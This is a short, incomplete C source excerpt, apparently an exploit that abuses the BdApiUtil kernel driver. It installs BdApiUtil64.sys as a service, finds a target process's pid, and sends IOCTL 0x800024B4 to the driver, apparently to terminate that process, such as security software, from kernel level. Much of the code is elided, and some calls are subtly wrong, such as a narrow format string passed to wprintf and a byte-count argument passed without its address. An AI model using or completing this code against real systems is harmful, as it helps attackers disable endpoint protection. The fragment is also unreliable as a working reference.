...
#define IoControlCode 0x800024B4
...
int main() {
	LPCSTR lpServiceName = "BdApiUtil";
	LPCSTR lpDisplayName = "Dispaly BdApiUtil";
	LPCSTR lpBinaryPathName = "C:\\Users\\Public\\BdApiUtil64.sys";
	...
	wprintf("[+] Get %s pid: %lu Success\n", lpProcessName, pid);

	HANDLE hDevice = CreateFileA("\\\\.\\BdApiUtil", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hDevice == NULL) {
	...
	DWORD dwRel = DeviceIoControl(hDevice, IoControlCode, &pid, sizeof(DWORD), NULL, sizeof(DWORD), dwBytesReturned, NULL);
	if(!dwRel) {
